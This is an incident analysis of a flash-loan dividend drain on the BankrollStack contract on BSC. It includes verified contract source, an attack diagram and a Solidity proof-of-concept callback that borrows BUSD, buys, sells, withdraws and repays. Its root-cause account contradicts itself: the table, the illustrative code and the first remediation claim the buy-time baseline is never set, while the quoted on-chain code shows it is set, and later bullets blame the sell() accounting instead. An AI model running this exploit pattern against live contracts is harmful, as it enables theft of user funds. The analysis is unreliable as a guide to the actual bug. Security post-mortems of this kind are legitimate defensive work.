# BankrollStack — Flash Loan Dividend Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2025-06-14 |
| **Protocol** | BankrollStack |
| **Chain** | BSC |
| **Loss** | ~5,000 USD |
| **Attacker** | [0x172dca3e72e4643ce8b7932f4947347c1e49ba6d](https://bscscan.com/address/0x172dca3e72e4643ce8b7932f4947347c1e49ba6d) |
| **Attack Tx** | [0x0706425b](https://bscscan.com/tx/0x0706425beba4b3f28d5a8af8be26287aa412d076828ec73d8003445c087af5fd) |
| **Vulnerable Contract** | [0x16d0a151297a0393915239373897bCc955882110](https://bscscan.com/address/0x16d0a151297a0393915239373897bCc955882110) |
| **Root Cause** | Logic flaw in dividend calculation within the buy → sell → withdraw flow where the baseline is immediately finalized |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-06/BankrollStack_exp.sol) |

---

## 1. Vulnerability Overview

BankrollStack belongs to the same dividend distribution contract family as BankrollNetwork. The attacker borrowed 28,300 BUSD via a PancakeSwap V3 flash loan and executed a full `buy` → `sell` → `withdraw` cycle to drain dividends. The core issue is a calculation flaw that allows profit to be generated through a pure buy-sell cycle alone, without any separate `donatePool` call.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable logic: dividend baseline (payoutsTo) is not immediately finalized at buy time
function buy(uint256 tokenAmount) external returns (uint256) {
    // Mints internal tokens from deposited tokens
    // If profitPerShare is already elevated due to prior donors,
    // the new buyer can retroactively receive past dividends
    uint256 tokens = tokenAmountToTokens(tokenAmount);
    balanceOf[msg.sender] += tokens;
    // payoutsTo is not immediately updated based on the current profitPerShare
}

// ✅ Fix: immediately finalize payoutsTo based on current profitPerShare at buy time
function buy(uint256 tokenAmount) external returns (uint256) {
    uint256 tokens = tokenAmountToTokens(tokenAmount);
    balanceOf[msg.sender] += tokens;
    // Set baseline so new entrants only receive dividends from this point forward
    payoutsTo[msg.sender] += (int256)(profitPerShare * tokens);
}
```

### On-Chain Source Code

Source: **Etherscan-verified** (V2 API, chainid 56) — BankrollNetworkStack `0x16d0a151297a0393915239373897bCc955882110`

```solidity
// buy() — Etherscan-verified verbatim (delegates to buyFor)
function buy(uint buy_amount) public returns (uint256)  {
    return buyFor(msg.sender, buy_amount);
}

// buyFor() / purchaseTokens() — Etherscan-verified verbatim (core buy logic)
function buyFor(address _customerAddress, uint buy_amount) public returns (uint256)  {
    require(token.transferFrom(msg.sender, address(this), buy_amount));
    totalDeposits += buy_amount;
    uint amount = purchaseTokens(_customerAddress, buy_amount);
    emit onLeaderBoard(_customerAddress,
        stats[_customerAddress].invested,
        tokenBalanceLedger_[_customerAddress],
        stats[_customerAddress].withdrawn,
        now
    );
    distribute();
    return amount;
}

function purchaseTokens(address _customerAddress, uint256 _incomingeth) internal returns (uint256) {
    if (stats[_customerAddress].invested == 0 && stats[_customerAddress].receivedTokens == 0) {
        players += 1;
    }
    totalTxs += 1;
    uint256 _undividedDividends = SafeMath.mul(_incomingeth, entryFee_) / 100;
    uint256 _amountOfTokens = SafeMath.sub(_incomingeth, _undividedDividends);
    emit onTokenPurchase(_customerAddress, _incomingeth, _amountOfTokens, now);
    require(_amountOfTokens > 0 && SafeMath.add(_amountOfTokens, tokenSupply_) > tokenSupply_);
    if (tokenSupply_ > 0) {
        tokenSupply_ += _amountOfTokens;
    } else {
        tokenSupply_ = _amountOfTokens;
    }
    allocateFees(_undividedDividends);
    tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
    // ❌ payoutsTo_ set based on current profitPerShare_ — does not block retroactive dividend claims
    // after a sell(), the accounting delta between entry and exit creates a positive dividendsOf()
    int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens);
    payoutsTo_[_customerAddress] += _updatedPayouts;
    stats[_customerAddress].invested += _incomingeth;
    stats[_customerAddress].xInvested += 1;
    return _amountOfTokens;
}

// sell() — Etherscan-verified verbatim
function sell(uint256 _amountOfTokens) onlyBagholders public {
    address _customerAddress = msg.sender;
    require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
    uint256 _undividedDividends = SafeMath.mul(_amountOfTokens, exitFee_) / 100;
    uint256 _taxedeth = SafeMath.sub(_amountOfTokens, _undividedDividends);
    tokenSupply_ = SafeMath.sub(tokenSupply_, _amountOfTokens);
    tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
    // ❌ payoutsTo_ reduction releases accumulated dividend credit — exploitable via buy→sell cycle
    int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens + (_taxedeth * magnitude));
    payoutsTo_[_customerAddress] -= _updatedPayouts;
    allocateFees(_undividedDividends);
    emit onTokenSell(_customerAddress, _amountOfTokens, _taxedeth, now);
    distribute();
}

// dividendsOf() — Etherscan-verified verbatim
function dividendsOf(address _customerAddress) public view returns (uint256) {
    return (uint256) ((int256) (profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude; // ❌ positive after buy+sell due to accounting delta
}

// withdraw() — Etherscan-verified verbatim
function withdraw() onlyStronghands public {
    address _customerAddress = msg.sender;
    uint256 _dividends = myDividends();
    payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);
    token.transfer(_customerAddress,_dividends); // ❌ pays out inflated dividends
    stats[_customerAddress].withdrawn = SafeMath.add(stats[_customerAddress].withdrawn, _dividends);
    stats[_customerAddress].xWithdrawn += 1;
    totalTxs += 1;
    totalClaims += _dividends;
    emit onWithdraw(_customerAddress, _dividends, now);
    emit onLeaderBoard(_customerAddress, stats[_customerAddress].invested, tokenBalanceLedger_[_customerAddress], stats[_customerAddress].withdrawn, now);
    distribute();
}
```

**Why it is exploitable (identify the bug from the code):**

- `buy(28,300 BUSD)` calls `purchaseTokens()`, which sets `payoutsTo_[attacker] += profitPerShare_ * _amountOfTokens`. This records the current accumulated dividend baseline so the buyer is excluded from past dividends.
- `sell(myTokens)` immediately reduces `payoutsTo_[attacker]` by `profitPerShare_ * _amountOfTokens + _taxedeth * magnitude`. The `_taxedeth` term (exit-fee-adjusted token amount) is subtracted from `payoutsTo_`, creating an artificial credit: after the sell, `dividendsOf()` returns a non-zero positive value even though the attacker held tokens for zero time.
- `withdraw()` pays out that `dividendsOf()` balance via `token.transfer()`, draining BUSD from the pool.
- The root cause is the `_taxedeth * magnitude` term added to `payoutsTo_` reduction in `sell()` — it over-credits the payout baseline relative to what was set in `purchaseTokens()`, leaving a collectible dividend after an atomic buy→sell cycle.

```solidity
// ✅ Fix: enforce a minimum holding period to block same-block buy/sell
mapping(address => uint256) public lastBuyBlock;

function buy(uint256 tokenAmount) external returns (uint256) {
    lastBuyBlock[msg.sender] = block.number;  // ✅ record buy block
    // ... existing logic ...
}

function sell(uint256 tokenAmount) external {
    require(block.number > lastBuyBlock[msg.sender], "same-block sell disallowed");  // ✅
    // ... existing logic ...
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ PancakeSwap V3 Pool: flash(28,300 BUSD)
  │         [pancakeV3FlashCallback callback]
  │
  ├─2─▶ BankrollStack.buy(28,300 BUSD)
  │         └─ Acquire internal tokens (dividend baseline not finalized)
  │
  ├─3─▶ BankrollStack.sell(myTokens())
  │         └─ Sell all internal tokens + accumulate dividends
  │
  ├─4─▶ BankrollStack.withdraw()
  │         └─ Collect inflated dividends
  │
  └─5─▶ PancakeSwap V3 Pool: repay(28,302.83 BUSD) + retain profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
    uint256 buyAmount = IERC20(BUSD).balanceOf(address(this)); // 28,300 BUSD
    uint256 repayAmount = 28302830000000000000000; // principal + fee

    // Approve BankrollStack for full amount
    IERC20(BUSD).approve(address(BankrollStack), type(uint256).max);

    // Buy with full amount — triggers dividend baseline vulnerability
    IBankrollStack(BankrollStack).buy(buyAmount);

    // Sell all internal tokens
    uint256 myTokens = IBankrollStack(BankrollStack).myTokens();
    IBankrollStack(BankrollStack).sell(myTokens);

    // Collect inflated dividends (returns more BUSD than principal)
    IBankrollStack(BankrollStack).withdraw();

    // Repay flash loan
    IERC20(BUSD).transfer(address(PancakeV3Pool), repayAmount);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Uninitialized dividend baseline (payoutsTo not set to current profitPerShare at buy time, allowing retroactive application of past dividends) |
| **Attack Vector** | Flash loan + atomic buy-sell-withdraw cycle |
| **Impact** | Protocol liquidity loss |
| **CWE** | CWE-682 (Incorrect Calculation) |
| **DASP** | Business Logic |

## 6. Remediation Recommendations

1. **Immediately finalize entry baseline**: Set `payoutsTo` to `profitPerShare * tokens` at `buy` time
2. **Prohibit same-block buy-sell**: Enforce a minimum holding period of at least 1 block
3. **Flash loan detection**: Block compound buy-sell-withdraw calls within callback functions
4. **Fork audit**: Conduct a full review of all projects based on the same codebase

## 7. Lessons Learned

- BankrollNetwork and BankrollStack share the same code family; a single vulnerability propagates across all derivative projects.
- Dividend distribution contracts must finalize the dividend baseline at the current point in time during `buy`.
- Forked projects do not inherit the audit results of the original, making independent security reviews essential.